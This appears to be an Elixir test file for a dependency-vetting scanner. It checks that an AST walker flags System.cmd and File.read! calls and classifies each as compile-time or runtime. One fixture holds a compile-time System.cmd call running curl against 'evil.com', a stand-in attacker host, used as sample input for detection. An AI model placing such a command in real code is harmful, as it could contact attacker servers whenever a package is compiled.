defmodule VetCore.AST.WalkerTest do
  use ExUnit.Case

  alias VetCore.AST.Walker
  alias VetCore.Checks.FileHelper
  alias VetCore.Types.Finding

  test "Walker.walk detects System.cmd in parsed AST" do
    source = """
    defmodule Foo do
      def run do
        System.cmd("ls", [])
      end
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    matcher = fn node, state ->
      case Walker.resolve_call(node, state) do
        {_type, [:System], :cmd, _args, meta} ->
          %Finding{
            dep_name: :test,
            file_path: state.file_path,
            line: meta[:line] || 0,
            check_id: :system_cmd,
            category: :system_exec,
            severity: :critical,
            compile_time?: FileHelper.compile_time?(state.context_stack),
            description: "System.cmd call"
          }

        _ ->
          nil
      end
    end

    findings = Walker.walk(ast, [matcher], "test.ex", :test)

    assert length(findings) > 0
    assert hd(findings).check_id == :system_cmd
  end

  test "detects compile-time code in module body" do
    source = """
    defmodule Foo do
      System.cmd("curl", ["https://evil.com"])

      def innocent, do: :ok
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    matcher = fn node, state ->
      case Walker.resolve_call(node, state) do
        {_type, [:System], :cmd, _args, meta} ->
          %Finding{
            dep_name: :test,
            file_path: state.file_path,
            line: meta[:line] || 0,
            check_id: :system_cmd,
            category: :system_exec,
            severity: :critical,
            compile_time?: FileHelper.compile_time?(state.context_stack),
            description: "System.cmd call"
          }

        _ ->
          nil
      end
    end

    findings = Walker.walk(ast, [matcher], "test.ex", :test)

    compile_time_findings = Enum.filter(findings, & &1.compile_time?)
    assert length(compile_time_findings) > 0
  end

  test "classifies def body code as runtime" do
    source = """
    defmodule Foo do
      def run do
        File.read!("config.json")
      end
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    matcher = fn node, state ->
      case Walker.resolve_call(node, state) do
        {_type, [:File], :read!, _args, meta} ->
          %Finding{
            dep_name: :test,
            file_path: state.file_path,
            line: meta[:line] || 0,
            check_id: :file_read,
            category: :file_access,
            severity: :warning,
            compile_time?: FileHelper.compile_time?(state.context_stack),
            description: "File.read! call"
          }

        _ ->
          nil
      end
    end

    findings = Walker.walk(ast, [matcher], "test.ex", :test)

    assert Enum.any?(findings, fn f -> not f.compile_time? end)
  end
end
